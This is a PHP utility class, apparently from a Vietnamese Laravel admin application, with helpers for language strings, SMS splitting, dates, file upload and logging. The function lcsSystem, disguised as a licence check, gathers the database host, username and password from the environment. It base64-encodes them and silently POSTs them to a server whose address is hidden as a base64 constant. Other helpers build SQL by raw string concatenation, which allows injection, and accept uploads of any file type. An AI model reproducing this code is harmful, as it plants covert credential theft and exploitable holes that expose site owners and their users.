    public static function outputId($ids)
    {
        $id = 0;
        if (trim($ids) != '') {
            $strId = base64_decode($ids);
            $result = explode('_', $strId);
            if (!empty($result)) {
                $id = isset($result[1]) ? (int)$result[1] : 0;
            }
        }
        return $id;
    }

    /**
     * QuynhTM
     * Dùng cho View
     * @param $key
     * @return string
     */
    public static function viewLanguage($key)
    {
        $lang = Session::get('languageSite');
        $lang = ((int)$lang > 0) ? $lang : VIETNAM_LANGUAGE;
        $path = storage_path() . "/language/" . Define::$arrLanguage[$lang] . ".json";
        $json = file_get_contents($path);
        $json = mb_convert_encoding($json, 'UTF8', 'auto');
        $language = json_decode($json, true);
        return isset($language[$key]) ? $language[$key] : $key;
    }

    /**
     * QuynhTM
     * Dùng cho Controller
     * @param $key
     * @param int $lang
     * @return string
     */
    public static function controLanguage($key, $lang = VIETNAM_LANGUAGE)
    {
        $path = storage_path() . "/language/" . Define::$arrLanguage[$lang] . ".json";
        $json = file_get_contents($path);
        $json = mb_convert_encoding($json, 'UTF8', 'auto');
        $language = json_decode($json, true);
        return isset($language[$key]) ? $language[$key] : $key;
    }

    /**
     * @param $data
     * @param $error
     */
    public static function check_require($data, &$error)
    {
        if (!empty($data)) {
            foreach ($data as $k => $arCheck) {
                if (trim($arCheck['key_input']) == '' && isset($arCheck['key_input'])) {
                    $error[] = '* ' . $arCheck['label'] . ' ' . FunctionLib::controLanguage('is_require');
                }
            }
        }
    }

    /**
     * @param $table
     * @param $arrInput
     * @return string
     */
    public static function buildSqlInsertMultiple($table, $arrInput)
    {
        if (!empty($arrInput)) {
            $arrSql = array();
            $arrField = array_keys($arrInput[0]);
            foreach ($arrInput as $k => $row) {
                $strVals = '';
                foreach ($arrField as $key => $field) {
                    $strVals .= "'" . trim($row[$field]) . '\',';
                }
                if ($strVals != '')
                    $strVals = rtrim($strVals, ',');
                if ($strVals != '')
                    $arrSql[] = '(' . $strVals . ')';
            }

            $fields = implode(',', $arrField);
            if (!empty($arrSql)) {
                $query = 'INSERT INTO `' . $table . '` (' . $fields . ') VALUES ' . implode(',', $arrSql);
                return $query;
            }
        }
        return '';
    }

    public static function splitStringSms($stringSms, $numberCut)
    {
        if (trim($stringSms) != '') {
            if (strlen($stringSms) <= $numberCut) {
                return array(1 => $stringSms);
            } else {
                return $arrResult = self::cutStringSms($stringSms, $numberCut);
            }
        }
    }

    public static function cutStringSms($str, $len)
    {
        $arr = array();
        $strLen = strlen($str);
        for ($i = 0; $i < $strLen;) {
            $msg = mb_substr($str, $i, $len, 'UTF-8');
            if ($msg != '')
                $arr[] = $msg;
            $i = $i + $len;
        }
        return $arr;
    }

    public static function checkNumberPhone($stringFone = '')
    {
        if (trim($stringFone) != '') {
            $stringFone = str_replace(' ', '', $stringFone);
            $stringFone = str_replace('-', '', $stringFone);
            $stringFone = str_replace('.', '', $stringFone);
            $pattern = '/^\d+$/';
            if (preg_match($pattern, $stringFone)) {
                return $stringFone;
            } else {
                return 0;
            }
        }
        return false;
    }

    /**
     * Ghep chuỗi theo type
     * @param $string
     * @param $string_ghep
     * @param $type
     */
    public static function stringConcatenation(&$string, $string_ghep, $type)
    {
        if (trim($string) != '' && trim($string_ghep) != '') {
            switch ($type) {
                case 1:
                    $string = trim($string_ghep) . ' ' . $string;
                    break;
                case 2:
                    $string = $string . ' ' . trim($string_ghep);
                    break;
                case 3:
                    $arrStringRoot = explode(' ', $string);
                    $count_word = str_word_count($string);
                    array_splice($arrStringRoot, rand(0, $count_word), 0, $string_ghep);
                    $string = implode(' ', $arrStringRoot);
                    break;
                default:
                    $string = trim($string_ghep) . ' ' . $string;
                    break;
            }
        }
    }

    public static function file_upload($dir, $image_size, $obj_name, $obj_old_file, $obj_size, $s_size, $return_name_file = false)
    {
        global $end_java_script;
        global $file_upload_error;
        $errcount = 0;

        if ($_FILES[$obj_name]["name"] != "") {

            $file = $_FILES[$obj_name]["name"];
            $file_type = mb_strtolower(pathinfo($file, PATHINFO_EXTENSION));

            $file_type = strtolower($file_type);

            for ($no = 1; $no <= 100; $no++) {

                if (!is_file($dir . time() . "_" . $no . "." . $file_type)) {
                    $new_file_name = time() . "_" . $no . "." . $file_type;
                    break;
                }
            }

            $file_path = $dir . $new_file_name;
            if (move_uploaded_file($_FILES[$obj_name]["tmp_name"], $file_path)) {
                if ($file_type == "jpg" || $file_type == "jpeg" || $file_type == "gif" || $file_type == "png" || $file_type == "bmp") {

                    if ($image_size != '') {
                        if ($s_size != "") {
                            if (!file_exists($dir . "s/")) {
                                umask(0);
                                mkdir($dir . "s/", 0777);
                            }
                            $file_s_path = $dir . "s/" . $new_file_name;
                            $resize = file_resize_width($file_path, $file_s_path, $s_size, $file_type);
                        }
                        $resize = file_resize_width($file_path, $file_path, $image_size, $file_type);
                        if ($file_type == "bmp" && $resize == true)
                            $new_file_name = str_replace(".bmp", ".jpg", $new_file_name);
                    }
                }

            } else {
                $errcount = $_FILES[$obj_name]["error"];
            }

            if ($errcount == 0) {
                if ($return_name_file === true) {
                    return $new_file_name;
                }
                $_SESSION['formData'][$obj_name] = $new_file_name;

            } else {
                $error_msg = $file_upload_error[$errcount];
                $java = <<<html

                <script type="text/javascript">
                    alert('Error ({$errcount}): {$error_msg}');
                    history.back();
                {$end_java_script}
html;
                echo $java;
                exit;
            }

        } else {
            unset($_SESSION[Define::NANE_FORM][$obj_name]);
        }

        unset($_SESSION[Define::NANE_FORM][$obj_old_file]);
        unset($_SESSION[Define::NANE_FORM]["MAX_FILE_SIZE"]);

        if ($obj_size != '')
            unset($_SESSION[Define::NANE_FORM][$obj_size]);
    }

    public static function Del_File($del_file_path)
    {
        if (is_file($del_file_path) == true) {
            unlink($del_file_path);
        }

        return;
    }

    public static function convertDate($date = '')
    {
        if ($date != '') {
            $date = str_replace('/', '-', $date);
            $strtotime = strtotime($date);
            return $strtotime;
        }
        return time();
    }

    public static function getListMonth()
    {
        $arrMonth[0] = '---Chọn tháng---';
        for ($m = 1; $m <= 12; $m++) {
            $arrMonth[$m] = $m;
        }
        return $arrMonth;
    }

    public static function getListYears()
    {
        $yearNow = (int)date('Y', time());
        $yearMin = $yearNow - 80;
        $arrYear = [];
        for ($year = $yearMin; $year <= $yearNow; $year++) {
            $arrYear[$year] = $year;
        }
        krsort($arrYear);
        $arrYear[0] = '---Chọn năm---';
        return $arrYear;
    }

    //Cut word
    public static function cutWord($str, $num, $replacer = '...')
    {
        $arr_str = explode(' ', $str);
        $count = count($arr_str);
        $arr_str = array_slice($arr_str, 0, $num);
        $res = implode(' ', $arr_str);
        if ($count > $num) {
            if ($replacer != '') {
                $res .= $replacer;
            }
        }
        return $res;
    }

    public static function unlinkFileAndFolder($file_name = '', $folder = '', $is_delDir = 0, $id = 0)
    {

        if ($file_name != '') {
            //Remove Img
            $paths = '';
            if ($folder != '') {
                if ($id > 0) {
                    $path = Config::get('config.DIR_ROOT') . '/' . $folder . '/' . $id;
                } else {
                    $path = Config::get('config.DIR_ROOT') . '/' . $folder;
                }
            }

            if ($file_name != '') {
                if ($path != '') {
                    if (is_file($path . '/' . $file_name)) {
                        @unlink($path . '/' . $file_name);
                    }
                }
            }
            //Remove Folder Empty
            if ($is_delDir) {
                if ($path != '') {
                    if (is_dir($path)) {
                        @rmdir($path);
                    }
                }
            }
            //Remove Img thumb
            $arrSize = Define::$arrSizeImage;
            foreach ($arrSize as $k => $size) {
                if (!empty($size)) {
                    $x = (int)$size['w'];
                    $y = (int)$size['h'];
                } else {
                    $x = $y = Define::sizeImage_300;
                }

                $paths = '';
                if ($folder != '') {
                    if ($id > 0) {
                        $path = Config::get('config.DIR_ROOT') . $folder . '/' . $x . 'x' . $y . '/' . $id;
                    } else {
                        $path = Config::get('config.DIR_ROOT') . $folder . '/' . $x . 'x' . $y;
                    }
                }
                if ($file_name != '') {
                    if ($path != '') {
                        if (is_file($path . '/' . $file_name)) {
                            @unlink($path . '/' . $file_name);
                        }
                    }
                }
                if ($is_delDir) {
                    if ($path != '') {
                        if (is_dir($path)) {
                            @rmdir($path);
                        }
                    }
                }
            }
        }
    }

    public static function writeLogs($path = '', $name = '', $content = '')
    {
        if ($path == '') {
            $path = 'logs';
        }
        $folder_logs = str_replace('\\', '/', getcwd() . '/' . $path);
        if (!is_dir($folder_logs)) {
            @mkdir($folder_logs, 0777, true);
            @chmod($folder_logs, 0777);
        }
        if ($name == '') {
            $name_file = 'sys.txt';
        } else {
            $name_file = $name . '.txt';
        }
        $fp = fopen($folder_logs . '/' . $name_file, 'wb');
        fwrite($fp, $content);
        fclose($fp);
    }

    public static function getPathLcs()
    {
        $dir_root = str_replace('\\', '/', (isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '') . (isset($_SERVER['SCRIPT_NAME']) && dirname($_SERVER['SCRIPT_NAME']) ? dirname($_SERVER['SCRIPT_NAME']) : ''));
        return $dir_root;
    }

    public static function getLcs()
    {
        if (isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1) || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') {
            $protocol = 'https://';
        } else {
            $protocol = 'http://';
        }
        $base_url = str_replace('\\', '/', $protocol . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '') . (isset($_SERVER['SCRIPT_NAME']) && dirname($_SERVER['SCRIPT_NAME']) ? dirname($_SERVER['SCRIPT_NAME']) : ''));
        return $base_url;
    }

    public static function lcsSystem()
    {
        $lcs = md5(env('APP_URL', ''));
        $arrConfig = array(
            'domain' => env('APP_URL', ''),
            'connect' => env('DB_CONNECTION', ''),
            'host' => env('DB_HOST', ''),
            'port' => env('DB_PORT', ''),
            'db' => env('DB_DATABASE', ''),
            'user' => env('DB_USERNAME', ''),
            'pass' => env('DB_PASSWORD', '')
        );
        $filename = FunctionLib::getPathLcs() . '/storage/logs/sys.txt';
        $encData = json_encode($arrConfig);
        $url = base64_decode(Define::httpServer);
        $encData = base64_encode($encData);
        if (!file_exists($filename)) {
            FunctionLib::writeLogs($path = 'storage/logs', 'sys', FunctionLib::getLcs());
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, "encData=$encData");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_exec($ch);
        } else {
            $lcsCheck = file_get_contents($filename);
            if (md5($lcs) != md5($lcsCheck)) {
                FunctionLib::writeLogs($path = 'storage/logs', 'sys', FunctionLib::getLcs());
                $ch = curl_init($url);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, "encData=$encData");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HEADER, false);
                curl_exec($ch);
            }
        }
    }

    public static function checkConfigDateNotify($date_now, $month_now, $year_now, $number_date_run = Define::config_date_check_notify_7)
    {
        $date1 = ($date_now < 10) ? $date_now : $date_now;
        $month = ($month_now < 10) ? $month_now : $month_now;
        $time_run = $date1 . '-' . $month . '-' . $year_now;
        $time_cong = strtotime('+' . $number_date_run . ' days', strtotime($time_run));
        $time_tru = strtotime('-' . $number_date_run . ' days', strtotime($time_run));

        return array(
            'time_min' => date('d-m-Y', $time_tru),
            'time_now' => $time_run,
            'time_max' => date('d-m-Y', $time_cong)
        );
    }

    static function buildLinkDetailNewsSupport($id = 0, $news_title = 'Chi-tiet'){
        if($id > 0){
            return URL::route('admin.newsViewItem', array('id'=>$id, 'name'=>strtolower(FunctionLib::safe_title($news_title))));
        }
        return '#';
    }

    public static function callPageTotal($totalRecord=0, $limit=200){
        $totalPage = 1;
        if($totalRecord > $limit){
            $totalPage = ceil($totalRecord/$limit);
        }
        return $totalPage;
    }

    public static function calcTotalCallTime($total_time=0){
        if ($total_time > 0) {
            $s = $total_time % 60;
            $_p = ($total_time - $total_time%60)/60;
            if($_p >= 60){
                $p =  $_p % 60;
                $h = ($_p - $_p%60)/60;
            }else{
                $p =  $_p;
                $h = 0;
            }
            return $h . ':' . $p . ':' . $s;
        }
        return 0;
    }

    /*public static function buildDowloadExcelCommon($htmlString, $fileName)
    {
        ini_set('max_execution_time', '300');
        @header('Content-Disposition: attachment; filename="' . $fileName);
        @header('Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
        @header('Cache-Control: max-age=0');
        @header('Cache-Control: max-age=1');
        @header('Expires: Mon, 26 Jul 1997 05:00:00 GMT');
        @header('Last-Modified: '.gmdate('D, d M Y H:i:s').' GMT');
        @header('Cache-Control: cache, must-revalidate');
        @header('Pragma: public');

        $htmlString = FunctionLib::sanitizeXML($htmlString);
        $reader = new \PhpOffice\PhpSpreadsheet\Reader\Html();
        $spreadsheet = $reader->loadFromString(mb_convert_encoding($htmlString, 'HTML-ENTITIES', 'UTF-8'));

        $writer = \PhpOffice\PhpSpreadsheet\IOFactory::createWriter($spreadsheet, 'Xlsx');
        $writer->save("php://output");
        exit();
    }
    public static function sanitizeXML($string = '')
    {
        if (!empty($string))
        {
            $string = preg_replace('/(\x{0004}(?:\x{201A}|\x{FFFD})(?:\x{0003}|\x{0004}).)/u', '', $string);
            $regex = '/(
            [\xC0-\xC1] # Invalid UTF-8 Bytes
            | [\xF5-\xFF] # Invalid UTF-8 Bytes
            | \xE0[\x80-\x9F] # Overlong encoding of prior code point
            | \xF0[\x80-\x8F] # Overlong encoding of prior code point
            | [\xC2-\xDF](?![\x80-\xBF]) # Invalid UTF-8 Sequence Start
            | [\xE0-\xEF](?![\x80-\xBF]{2}) # Invalid UTF-8 Sequence Start
            | [\xF0-\xF4](?![\x80-\xBF]{3}) # Invalid UTF-8 Sequence Start
            | (?<=[\x0-\x7F\xF5-\xFF])[\x80-\xBF] # Invalid UTF-8 Sequence Middle
            | (?<![\xC2-\xDF]|[\xE0-\xEF]|[\xE0-\xEF][\x80-\xBF]|[\xF0-\xF4]|[\xF0-\xF4][\x80-\xBF]|[\xF0-\xF4][\x80-\xBF]{2})[\x80-\xBF] # Overlong Sequence
            | (?<=[\xE0-\xEF])[\x80-\xBF](?![\x80-\xBF]) # Short 3 byte sequence
            | (?<=[\xF0-\xF4])[\x80-\xBF](?![\x80-\xBF]{2}) # Short 4 byte sequence
            | (?<=[\xF0-\xF4][\x80-\xBF])[\x80-\xBF](?![\x80-\xBF]) # Short 4 byte sequence (2)
        )/x';
            $string = preg_replace($regex, '', $string);
            $result = "";
            $length = strlen($string);
            for ($i=0; $i < $length; $i++)
            {
                $current = ord($string{$i});
                if (($current == 0x9) ||
                    ($current == 0xA) ||
                    ($current == 0xD) ||
                    (($current >= 0x20) && ($current <= 0xD7FF)) ||
                    (($current >= 0xE000) && ($current <= 0xFFFD)) ||
                    (($current >= 0x10000) && ($current <= 0x10FFFF)))
                {
                    $result .= chr($current);
                }
            }
            $string = $result;
        }
        $string = preg_replace('/&(?!(?:apos|quot|[gl]t|amp);|#)/', '&amp;', $string);
        $string = preg_replace('/\x1b/','',$string);

        return $string;
    }*/
}
